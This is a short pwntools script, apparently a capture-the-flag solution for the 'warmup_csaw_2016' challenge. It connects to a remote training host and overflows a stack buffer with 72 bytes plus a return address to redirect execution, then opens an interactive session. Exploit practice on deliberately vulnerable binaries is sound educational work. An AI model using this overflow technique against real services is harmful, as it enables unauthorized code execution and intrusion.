from pwn import *
#context.log_level = 'debug'
#p = process("./warmup_csaw_2016")
p = remote("node3.buuoj.cn",28063)
payload = "a"*72 + p64(0x40060D)
p.sendline(payload)
p.recvline()
p.interactive()